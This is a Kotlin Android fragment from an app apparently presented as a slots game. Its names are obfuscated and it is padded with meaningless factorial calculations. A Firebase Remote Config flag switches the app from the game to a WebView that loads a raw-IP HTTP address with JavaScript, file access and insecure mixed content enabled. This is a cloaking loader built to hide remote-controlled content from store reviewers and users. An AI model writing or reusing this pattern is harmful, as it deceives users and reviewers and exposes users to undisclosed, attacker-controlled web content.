package com.sevens.slots.spectgame.dsfkhfjkdshfjsdk.lfjslkdsjfjdsf.jkdlsjhfjsdhfjki

import android.os.Bundle
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.webkit.WebChromeClient
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.core.view.isVisible
import androidx.fragment.app.Fragment
import androidx.navigation.fragment.findNavController
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.sevens.slots.spectgame.R
import com.sevens.slots.spectgame.databinding.DsfusdyreyureuyerBinding

import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import java.io.IOException
import java.math.BigInteger


class jkdsgjkdshfdhsfhjdh : Fragment() {
    val fijdgjoifjhg by lazy { DsfusdyreyureuyerBinding.inflate(layoutInflater) }



    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val n = 20
        val factorial = calculateFactorial(n)
        Log.d("FactorialCalculation", "Factorial of $n is $factorial")

        val nWithModulo = 30
        val modulo = 1000000
        val factorialWithModulo = calculateFactorial(nWithModulo, modulo)
        Log.d("FactorialCalculation", "Factorial of $nWithModulo modulo $modulo is $factorialWithModulo")


        getLoudingLogic()

    }

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?,
        savedInstanceState: Bundle?
    ): View? {


        val n = 20
        val factorial = calculateFactorial(n)
        Log.d("FactorialCalculation", "Factorial of $n is $factorial")

        val nWithModulo = 30
        val modulo = 1000000
        val factorialWithModulo = calculateFactorial(nWithModulo, modulo)
        Log.d("FactorialCalculation", "Factorial of $nWithModulo modulo $modulo is $factorialWithModulo")


        return fijdgjoifjhg.root
    }

   inner class MyWebView(val actionReddict:()->Unit):WebViewClient(){

        override fun onReceivedError(
            view: WebView?,
            request: WebResourceRequest?,
            error: WebResourceError?
        ) {
      //      actionReddict()
        }

       override fun shouldOverrideUrlLoading(view: WebView, url:String ): Boolean {
           if(url == "https://www.youtube.com/"){
               actionReddict()
           }else{
               fijdgjoifjhg.cvzug.isVisible = false
               (requireContext() as MainActivity).binding.Blogin
           }
           return false
       }


    }

  suspend  fun isOnline(url: String): String {
      val client = OkHttpClient()
      val request = Request.Builder()
          .url(url)
          .build()

      try {
          val response: Response = client.newCall(request).execute()
          if (response.isSuccessful) {
              return response.body?.string() ?: ""
          }
      } catch (e: IOException) {
          e.printStackTrace()
          withContext(Dispatchers.Main) {
              findNavController().navigate(R.id.action_web_game)
          }
      }

      return ""

  }


fun calculateFactorial(n: Int, modulo: Int? = null): BigInteger {
    if (n < 0) {
        throw IllegalArgumentException("Factorial is not defined for negative numbers")
    }

    var result = if (n == 0) BigInteger.ONE else BigInteger.valueOf(n.toLong())
    var i = n - 1

    while (i > 0) {
        result = result.multiply(BigInteger.valueOf(i.toLong()))
        if (modulo != null) {
            result = result.mod(BigInteger.valueOf(modulo.toLong()))
        }
        i--
    }

    return result
}

private fun getLoudingLogic() {

    val fireBaseLinc = FirebaseRemoteConfig.getInstance()
    fireBaseLinc.fetchAndActivate()
        .addOnCompleteListener { reqest ->
            if (reqest.isSuccessful) {
                val getFB = FirebaseRemoteConfig.getInstance().getString("getContent")

                if (getFB.isNotBlank()) {

                    try {
                       // findNavController().navigate(R.id.action_louding_webview)
                        goOffer()

                    } catch (kdsljkldsjdI :Exception) {
                        findNavController().navigate(R.id.action_web_game)
                    }
                } else {
                    findNavController().navigate(R.id.action_web_game)

                }
            } else {

                findNavController().navigate(R.id.action_web_game)
            }
        }




}
    fun goOffer() {
        val n = 20
        val factorial = calculateFactorial(n)
        Log.d("FactorialCalculation", "Factorial of $n is $factorial")

        val nWithModulo = 30
        val modulo = 1000000
        val factorialWithModulo = calculateFactorial(nWithModulo, modulo)
        Log.d(
            "FactorialCalculation",
            "Factorial of $nWithModulo modulo $modulo is $factorialWithModulo"
        )


        CoroutineScope(Dispatchers.IO).launch {
            isOnline("https://www.youtube.com/")
        }


        (requireContext() as MainActivity).goBack = {}
        fijdgjoifjhg.vebview.setWebChromeClient(WebChromeClient())
        with(fijdgjoifjhg.vebview) {
            (requireContext() as MainActivity).goBack = { goBack() }
            /*settings.setLoadsImagesAutomatically(true)*/
            webViewClient =
                MyWebView({ findNavController().navigate(com.sevens.slots.spectgame.R.id.action_web_game) })
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.domStorageEnabled = true
            fijdgjoifjhg.vebview.loadUrl("http://78.141.196.75/N3qTqC")
        }

    }

}
